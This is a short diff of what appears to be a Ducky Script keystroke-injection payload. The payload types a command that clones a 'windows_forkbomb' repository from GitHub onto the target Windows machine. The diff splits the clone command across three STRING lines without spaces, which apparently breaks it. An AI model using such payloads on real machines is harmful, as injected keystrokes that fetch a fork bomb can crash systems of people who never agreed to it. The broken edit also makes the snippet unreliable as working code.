@@ -9,7 +9,9 @@ ENTER
 
 REM Making file
 
-STRING git clone https://github.com/nrobillard/windows_forkbomb.git
+STRING git
+STRING clone
+STRING https://github.com/nrobillard/windows_forkbomb.git
 ENTER
 
 
